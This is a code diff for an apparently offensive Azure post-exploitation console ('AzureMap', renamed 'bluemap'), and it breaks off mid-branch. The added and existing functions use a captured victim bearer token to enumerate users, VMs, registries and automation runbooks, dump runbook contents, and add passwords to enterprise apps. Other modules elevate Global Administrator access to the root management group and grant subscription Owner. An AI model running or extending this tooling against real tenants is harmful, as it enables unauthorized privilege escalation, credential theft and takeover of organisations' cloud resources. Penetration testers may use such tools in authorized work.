@@ -13,6 +13,9 @@ TotalTargets = []
 TargetSubscription = None
 TargetTenantId = None
 ExploitChoosen = None
+hasGraphAccess = False
+hasMgmtAccess = False
+hasVaultEnabled = False
 
 
 class SimpleCompleter(object):
@@ -40,34 +43,29 @@ class SimpleCompleter(object):
             response = None
         return response
 
-def banner():
-    a = '''
-       db                                                         88b           d88                                                             
-      d88b                                                        888b         d888                                                             
-     d8'`8b                                                       88`8b       d8'88                                                             
-    d8'  `8b      888888888  88       88  8b,dPPYba,   ,adPPYba,  88 `8b     d8' 88  ,adPPYYba,  8b,dPPYba,                                     
-   d8YaaaaY8b          a8P"  88       88  88P'   "Y8  a8P_____88  88  `8b   d8'  88  ""     `Y8  88P'    "8a                                    
-  d8""""""""8b      ,d8P'    88       88  88          8PP"""""""  88   `8b d8'   88  ,adPPPPP88  88       d8                                    
- d8'        `8b   ,d8"       "8a,   ,a88  88          "8b,   ,aa  88    `888'    88  88,    ,88  88b,   ,a8"                                    
-d8'          `8b  888888888   `"YbbdP'Y8  88           `"Ybbd8"'  88     `8'     88  `"8bbdP"Y8  88`YbbdP"'                                     
-                                                                                                 88
-
-                                                                                     V.1.0 By Th3location
-                '''
-    print(a)
-
-
 def parseUPN():
-    global Token
-    b64_string = Token.split(".")[1]
-    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
-    return json.loads(base64.b64decode(b64_string))['upn']
+    global accessTokenGraph, Token
+    if accessTokenGraph is None or Token is None:
+        print("No Token has been set.")
+    else:
+        b64_string = Token.split(".")[1]
+        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
+        return json.loads(base64.b64decode(b64_string))['upn']
 
 def parseUPNObjectId():
-    global Token
-    b64_string = Token.split(".")[1]
-    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
-    return json.loads(base64.b64decode(b64_string))['oid']
+    global accessTokenGraph, Token
+    if accessTokenGraph is None or Token is None:
+        print("No Token has been set.")
+    else:
+        b64_string = Token.split(".")[1]
+        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
+        return json.loads(base64.b64decode(b64_string))['oid']
+def hasTokenInPlace():
+    global accessTokenGraph, Token
+    if accessTokenGraph is None or Token is None:
+        return False
+    else:
+        return True
 
 def setToken(token):
     global Token
@@ -88,8 +86,46 @@ def originitToken(token):
         sys.exit(-1)
     else:
         print("All set.")
-        global Token
+        global Token, hasMgmtAccess
+        hasMgmtAccess = True
         Token = token
+
+
+def currentScope():
+    global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
+    global accessTokenGraph, Token
+    if accessTokenGraph is None or Token is None:
+        print("No Token has been set.")
+    else:
+        strA = []
+        if hasGraphAccess:
+            strA.append("Graph enabled")
+        if hasMgmtAccess:
+            strA.append("Azure RABC enabled")
+        if hasVaultEnabled:
+            strA.append("Vault enabled")
+        print("Enabled Scope(s): " + str(" | ").join(strA))
+
+def currentProfile():
+    global accessTokenGraph, Token
+    if accessTokenGraph is None or Token is None:
+        print("No Token has been set.")
+    else:
+        strigify = parseUPN().split("@")
+        if Token == None:
+            print("Please load a token.")
+        else:
+            print(strigify[1] + "\\" + strigify[0])
+
+def RD_ListAllUsers():
+    global accessTokenGraph
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + accessTokenGraph
+    }
+    r = requests.get("https://graph.microsoft.com/v1.0/users/",
+                     headers=headers)
+    return r.json()
 
 
 '''
@@ -185,6 +221,74 @@ def RD_ListExposedWebApps():
         return r.json()
     return False
 
+def RD_ListAllACRs():
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        r = requests.get(
+            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01",
+            headers=headers)
+        return r.json()
+    return False
+
+def RD_ListAllVMs():
+    global Token
+    result = []
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        for res in getResGroup(sub['subscriptionId'])['value']:
+            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", headers=headers)
+            for item in rsVM.json()['value']:
+                item['subscriptionId'] = sub['subscriptionId']
+                item['resourceGroup'] = res['name']
+                result.append(item)
+    return result
+
+def RD_ListAutomationAccounts():
+    global Token
+    result = []
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        r = requests.get(
+            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
+            headers=headers)
+        for item in r.json()['value']:
+            item['subscriptionId'] = sub['subscriptionId']
+            result.append(item)
+    return result
+
+def RD_ListRunBooksByAutomationAccounts():
+    global Token
+    result = []
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        pathToAutomationAccount = requests.get(
+            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
+            headers=headers)
+        for automationAccount in pathToAutomationAccount.json()['value']:
+            GetRunBook = requests.get("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01",headers=headers)
+            for item in GetRunBook.json()['value']:
+                item['subscriptionId'] = str(sub['subscriptionId'])
+                item['automationAccount'] = str(automationAccount['name'])
+                result.append(item)
+    return result
+
 def RD_ListARMTemplates():
     global Token
 
@@ -249,7 +353,7 @@ def RD_addPasswordForEntrepriseApp(appId):
         return "N/A"
 
 def tryGetToken():
-    global accessTokenGraph
+    global accessTokenGraph, hasGraphAccess, hasMgmtAccess
     try:
         accessToken = None
         add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
@@ -263,6 +367,8 @@ def tryGetToken():
         elif add.stdout == "" or graph.stdout == "":
             print("Failed generate token. You may need to login or try manually.")
         else:
+            hasGraphAccess = True
+            hasMgmtAccess = True
             print("Captured token done. All set!")
             jres = json.loads(add.stdout)
             jresgraph = json.loads(graph.stdout)
@@ -380,6 +486,36 @@ def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
     result = r.json()
     return result
 
+def RD_DumpRunBookContent(runbookGUID):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.get(
+        "https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",
+        headers=headers)
+    if r.status_code == 200:
+        result = r.text
+    else:
+        result = None
+    return result
+
+def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.get(
+        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01",
+        headers=headers)
+    if r.status_code == 200:
+        result = r.json()['properties']['ipAddress']
+    else:
+        result = "N/A"
+    return result
+
 def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
     global Token
     headers = {
@@ -410,15 +546,6 @@ def AboutWindow():
 
 def getToken():
     return Token
-
-
-def displayMenu(state):
-    if state:
-        print(
-            "(1) Auto Generate Token\n(2) Set Azure Tokens\n(3) Display Token\n(4) Reset Azure Token\n(5) Attack Mode\n(6) About AzureMap");
-    else:
-        return False
-
 
 def ListSubscriptionsForToken():
     global Token
@@ -454,244 +581,378 @@ def GetAllResourceGroupsUnderSubscription(subscriptionId):
     result = r.json()
     return result
 
-
-displayMenu(True)
-
 def attackWindow():
-    readline.set_completer(SimpleCompleter(['iam full scan', 'iam roles scan', 'iam permission scan', 'get resources','get sts','get subs','set target <subscriptionId>','sts <subscriptionId>','del target <subscriptionId>','del sts <subscriptionId>','back','exit','show exploits']).complete)
+    supportedCommands = [
+        "whoami",
+        "scopes",
+        "get_subs",
+        "set_target",
+        "get_target",
+        "get_resources",
+        "get_res",
+        "sts",
+        "subs",
+        "iam full scan",
+        "iam roles scan",
+        "iam permission scan",
+        "show exploits",
+        "showtoken",
+        "deltoken",
+        "run",
+        "use",
+        "exit",
+        "back"
+    ]
+    exploits = [
+        "Token/GenToken",
+        "Token/SetToken",
+        "Reader/ListAllUsers",
+        "Reader/ExposedAppServiceApps",
+        "Reader/ListAllAzureContainerRegistry",
+        "Reader/ListAutomationAccounts",
+        "Reader/DumpAllRunBooks",
+        "Reader/ListAllRunBooks",
+        "Reader/ARMTemplatesDisclosure",
+        "Reader/ListServicePrincipal",
+        "Reader/abuseServicePrincipals",
+        "GlobalAdministrator/elevateAccess"
+    ]
+    readline.set_completer(SimpleCompleter(exploits).complete)
     readline.parse_and_bind('tab: complete')
     while (True):
         global TargetSubscription
         global TotalTargets
         global Token
         global ExploitChoosen
+
         if ExploitChoosen is not None:
             mode = input("$ exploit(" + ExploitChoosen + ") >> ")
         else:
-            mode = input("$ >> ")
-        if mode == "help":
-            print(
-                " ===== IAM Abuse =====\niam full scan\niam roles scan\niam permission scan\niam role abuse <ID>\niam permission abuse <ID>\n ===== ARM =====\nget resources / get res\n ===== Utilities =====\nget subs\nset target <subscriptionId> / sts <subscriptionId>\ndel target <subscriptionId> \ del sts\nback / exit")
-        elif mode == "get subs":
-            listSubs = ListSubscriptionsForToken()
-            if listSubs.get('value') == None:
-                print("Error occured. Result: " + str(listSubs['error']['message']))
-            else:
-                subRecords = PrettyTable()
-                subRecords.align = "l"
-                subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
-                subRecordCount = 0
-                for subRecord in listSubs['value']:
-                    subRecords.add_row(
-                        [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
-                         subRecord['subscriptionPolicies']['quotaId'],
-                         subRecord['subscriptionPolicies']['spendingLimit']])
-                    subRecordCount += 1
-                    TotalTargets.append(subRecord['subscriptionId'])
-                print(subRecords)
-        elif "set target " in mode or "sts " in mode:
-            argSub = mode.replace("set target", "").replace("sts", "").replace(" ", "")
-            if argSub not in TotalTargets:
-                print("Invalid target subscription.")
-            else:
-                print("Set to target SubscriptionId " + argSub)
-                TargetSubscription = argSub
-        elif "del target " in mode or "del sts " in mode:
-            print("Target SubscriptionId cleared!")
-            TargetSubscription = []
-        elif "iam full scan" in mode:
-            print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
-            allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-            allRolesAssignsRecords = PrettyTable()
-            allRolesAssignsRecords.align = "l"
-            allRolesAssignsRecordsCount = 0
-            allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
-            for role in range(0, len(allRolesAssigns)):
-                resultAllRolesAssigns = allRolesAssigns
-                currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
-                currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
-                currentRoleName = currentRoleInformation['properties']['roleName']
-                allRolesAssignsRecordsCount += 1
-                if canRoleBeAbused(currentRoleName) is not False:
-                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
-                else:
-                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
-            print(allRolesAssignsRecords)
-            print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
-            allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-            allPermRolesAssignsRecords = PrettyTable()
-            allPermRolesAssignsRecords.align = "l"
-            allPermRolesAssignsRecordsCount = 0
-            allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
-            for rolePermission in range(0, len(allPermRolesAssigns)):
-                resultAllRolesAssigns = allPermRolesAssigns
-                currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
-                    resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
-                currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
-                currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
-                for permission in currentRolePermissions:
-                    allPermRolesAssignsRecordsCount += 1
-                    if canPermissionBeAbused(permission) is not False:
-                        allPermRolesAssignsRecords.add_row(
-                            [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
-                    else:
-                        allPermRolesAssignsRecords.add_row(
-                            [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
-            print(allPermRolesAssignsRecords)
-        elif "iam roles scan" in mode:
-            print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
-            allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-            allRolesAssignsRecords = PrettyTable()
-            allRolesAssignsRecords.align = "l"
-            allRolesAssignsRecordsCount = 0
-            allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
-            for role in range(0, len(allRolesAssigns)):
-                resultAllRolesAssigns = allRolesAssigns
-                currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
-                currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
-                currentRoleName = currentRoleInformation['properties']['roleName']
-                allRolesAssignsRecordsCount += 1
-                if canRoleBeAbused(currentRoleName) is not False:
-                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
-                else:
-                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
-            print(allRolesAssignsRecords)
-        elif "iam permission scan" in mode:
-            print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
-            allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-            allPermRolesAssignsRecords = PrettyTable()
-            allPermRolesAssignsRecords.align = "l"
-            allPermRolesAssignsRecordsCount = 0
-            allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
-            for rolePermission in range(0, len(allPermRolesAssigns)):
-                resultAllRolesAssigns = allPermRolesAssigns
-                currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
-                currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
-                currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
-                for permission in currentRolePermissions:
-                    allPermRolesAssignsRecordsCount += 1
-                    if canPermissionBeAbused(permission) is not False:
-                        allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
-                    else:
-                        allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
-            print(allPermRolesAssignsRecords)
-        elif "get resources" in mode or "get res" in mode:
-            if TargetSubscription == None:
-                print("Please set target subscription.")
-            else:
-                print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
-                resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
-                resultsInternalRes = resultResources['value']
-                subResRecords = PrettyTable()
-                subResRecords.align = "l"
-                subResRecordCount = 0
-                subResRecords.field_names = ["#", "Resource Name", "Type", "Location"]
-                for objRes in range(0, len(resultsInternalRes)):
-                    resultResources = resultsInternalRes
-                    subResRecordCount += 1
-                    subResRecords.add_row(
-                        [subResRecordCount, resultResources[objRes]['name'], resultResources[objRes]['type'],
-                         resultResources[objRes]['location']])
-                print(subResRecords)
-        elif mode == "show exploits":
-            subExploitRecords = PrettyTable()
-            subExploitRecords.align = "l"
-            subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
-            subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
-            print(subExploitRecords)
-        elif "use " in mode:
-            argExpSub = mode.replace("use ", "").replace(" ", "")
-            ExploitChoosen = argExpSub
-        elif mode == "back" or mode == "exit":
-            if ExploitChoosen is not None:
-                ExploitChoosen = None
-            else:
-                exit
-                statupWindow(True)
-        elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
-            print("Trying to enumerate all external-facing Azure Service Apps..")
-            AppServiceRecords = PrettyTable()
-            AppServiceRecords.align = "l"
-            AppServiceRecords.field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)"]
-            AppServiceRecordsCount = 0
-            for AppServiceRecord in RD_ListExposedWebApps()['value']:
-                AppServiceRecords.add_row([AppServiceRecordsCount, AppServiceRecord['name'], AppServiceRecord['kind'], AppServiceRecord['properties']['state'], ",".join(AppServiceRecord['properties']['enabledHostNames'])])
-                AppServiceRecordsCount += 1
-            print(AppServiceRecords)
-        elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
-            print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
-            ArmTempRecords = PrettyTable()
-            ArmTempRecords.align = "l"
-            ArmTempRecords.field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
-            ArmTempRecordsCount = 0
-            print("Skipping SecureString/Object/Array values from list..")
-            for ArmTempRecord in RD_ListARMTemplates():
-                for itStr in ArmTempRecord['params']:
-                    if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
-                        continue
-                    ArmTempRecords.add_row(
-                        [ArmTempRecordsCount, ArmTempRecord['name'], itStr, ArmTempRecord['params'][itStr]['type'],
-                         ArmTempRecord['params'][itStr]['value']])
-                for itStrO in ArmTempRecord['outputs']:
-                    ArmTempRecords.add_row([ArmTempRecordsCount, ArmTempRecord['name'], itStrO, ArmTempRecord['outputs'][itStrO]['type'],ArmTempRecord['outputs'][itStrO]['value']])
-                ArmTempRecordsCount += 1
-            print(ArmTempRecords)
-        elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
-            print("Trying to enumerate all service principles (App registrations)..")
-            EntAppsRecords = PrettyTable()
-            EntAppsRecords.align = "l"
-            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
-            EntAppsRecordsCount = 0
-            for EntAppsRecord in RD_AddAppSecret()['value']:
-                EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
-                EntAppsRecordsCount += 1
-            print(EntAppsRecords)
-        elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
-            print("Trying to enumerate all Enterprise applications (service principals)..")
-            EntAppsRecords = PrettyTable()
-            EntAppsRecords.align = "l"
-            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
-            EntAppsRecordsCount = 0
-            for EntAppsRecord in RD_AddAppSecret()['value']:
-                print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
-                pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
-                if pwdGen == "N/A":
-                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
-                else:
-                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
-                                            EntAppsRecord['publisherDomain'],pwdGen])
-                EntAppsRecordsCount += 1
-            print(EntAppsRecords)
-        elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
-            print("Elevating access to the root management group..")
-            print(GA_ElevateAccess())
-            print("Listing Target Subscriptions..")
-            listSubs = ListSubscriptionsForToken()
-            if listSubs.get('value') == None:
-                print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
-            else:
-                subRecords = PrettyTable()
-                subRecords.align = "l"
-                subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
-                subRecordCount = 0
-                for subRecord in listSubs['value']:
-                    subRecords.add_row(
-                        [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
-                         subRecord['subscriptionPolicies']['quotaId'],
-                         subRecord['subscriptionPolicies']['spendingLimit']])
-                    subRecordCount += 1
-                print(subRecords)
-                TargetSubscriptionVictim = input("Choose Subscription >> ")
-                print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
+            mode = input("$ bluemap >> ")
+
+        checkCmdInital = mode.split(" ")
+        if checkCmdInital[0] not in supportedCommands:
+            print("Not supported command. Supported commands: " + str(supportedCommands))
         else:
-            print("unkown command.")
+            if mode == "whoami":
+                currentProfile()
+            elif mode == "scopes":
+                currentScope()
+            elif mode == "get_subs" or mode == "subs":
+                listSubs = ListSubscriptionsForToken()
+                if listSubs.get('value') == None:
+                    print("Error occured. Result: " + str(listSubs['error']['message']))
+                else:
+                    subRecords = PrettyTable()
+                    subRecords.align = "l"
+                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    subRecordCount = 0
+                    for subRecord in listSubs['value']:
+                        subRecords.add_row(
+                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
+                             subRecord['subscriptionPolicies']['quotaId'],
+                             subRecord['subscriptionPolicies']['spendingLimit']])
+                        subRecordCount += 1
+                        TotalTargets.append(subRecord['subscriptionId'])
+                    print(subRecords)
+            elif "set_target" in mode or "sts" in mode:
+                argSub = mode.split(" ")
+                if len(argSub) < 2:
+                    print("No subscription has been selected.")
+                else:
+                    if argSub[1] not in TotalTargets:
+                        print("Invalid target subscription.")
+                    else:
+                        print("Set to target SubscriptionId " + argSub[1])
+                        TargetSubscription = argSub[1]
+            elif "get_target" in mode:
+                print("Current Target SubscriptionId = " + str(TargetSubscription))
+            elif "iam full scan" in mode:
+                print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
+                allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+                allRolesAssignsRecords = PrettyTable()
+                allRolesAssignsRecords.align = "l"
+                allRolesAssignsRecordsCount = 0
+                allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
+                for role in range(0, len(allRolesAssigns)):
+                    resultAllRolesAssigns = allRolesAssigns
+                    currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
+                    currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
+                    currentRoleName = currentRoleInformation['properties']['roleName']
+                    allRolesAssignsRecordsCount += 1
+                    if canRoleBeAbused(currentRoleName) is not False:
+                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
+                    else:
+                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
+                print(allRolesAssignsRecords)
+                print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
+                allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+                allPermRolesAssignsRecords = PrettyTable()
+                allPermRolesAssignsRecords.align = "l"
+                allPermRolesAssignsRecordsCount = 0
+                allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
+                for rolePermission in range(0, len(allPermRolesAssigns)):
+                    resultAllRolesAssigns = allPermRolesAssigns
+                    currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
+                        resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
+                    currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
+                    currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
+                    for permission in currentRolePermissions:
+                        allPermRolesAssignsRecordsCount += 1
+                        if canPermissionBeAbused(permission) is not False:
+                            allPermRolesAssignsRecords.add_row(
+                                [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
+                        else:
+                            allPermRolesAssignsRecords.add_row(
+                                [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
+                print(allPermRolesAssignsRecords)
+            elif "iam roles scan" in mode:
+                print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
+                allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+                allRolesAssignsRecords = PrettyTable()
+                allRolesAssignsRecords.align = "l"
+                allRolesAssignsRecordsCount = 0
+                allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
+                for role in range(0, len(allRolesAssigns)):
+                    resultAllRolesAssigns = allRolesAssigns
+                    currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
+                    currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
+                    currentRoleName = currentRoleInformation['properties']['roleName']
+                    allRolesAssignsRecordsCount += 1
+                    if canRoleBeAbused(currentRoleName) is not False:
+                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
+                    else:
+                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
+                print(allRolesAssignsRecords)
+            elif "iam permission scan" in mode:
+                print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
+                allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+                allPermRolesAssignsRecords = PrettyTable()
+                allPermRolesAssignsRecords.align = "l"
+                allPermRolesAssignsRecordsCount = 0
+                allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
+                for rolePermission in range(0, len(allPermRolesAssigns)):
+                    resultAllRolesAssigns = allPermRolesAssigns
+                    currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
+                    currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
+                    currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
+                    for permission in currentRolePermissions:
+                        allPermRolesAssignsRecordsCount += 1
+                        if canPermissionBeAbused(permission) is not False:
+                            allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
+                        else:
+                            allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
+                print(allPermRolesAssignsRecords)
+            elif "get_resources" in mode or "get_res" in mode:
+                if TargetSubscription == None:
+                    print("Please set target subscription.")
+                else:
+                    print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
+                    resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
+                    resultsInternalRes = resultResources['value']
+                    subResRecords = PrettyTable()
+                    subResRecords.align = "l"
+                    subResRecordCount = 0
+                    subResRecords.field_names = ["#", "Resource Name", "Type", "Location"]
+                    for objRes in range(0, len(resultsInternalRes)):
+                        resultResources = resultsInternalRes
+                        subResRecordCount += 1
+                        subResRecords.add_row(
+                            [subResRecordCount, resultResources[objRes]['name'], resultResources[objRes]['type'],
+                             resultResources[objRes]['location']])
+                    print(subResRecords)
+            elif mode == "show exploits":
+                subExploitRecords = PrettyTable()
+                subExploitRecords.align = "l"
+                subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
+                subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
+                print(subExploitRecords)
+            elif "use" in mode:
+                argExpSub = mode.replace("use ", "").replace(" ", "")
+                if argExpSub == "use":
+                    print("please choose an exploit")
+                else:
+                    checkExploitInital = mode.split("use ")
+                    if checkExploitInital[1] not in exploits:
+                        print("Not supported exploit. Supported exploits: " + str(exploits))
+                    else:
+                        if hasTokenInPlace():
+                            ExploitChoosen = argExpSub
+                        else:
+                            if "Token/" in checkExploitInital[1]:
+                                ExploitChoosen = argExpSub
+                            else:
+                                print("Please set target victim access token. Use Token/* exploits.")
+            elif mode == "back" or mode == "exit":
+                if ExploitChoosen is not None:
+                    ExploitChoosen = None
+                else:
+                    exit
+            elif mode == "showtoken":
+                print(getToken())
+            elif mode == "deltoken":
+                print("Resetting token..")
+                setToken("")
+            elif "Token/GenToken" in ExploitChoosen and mode == "run":
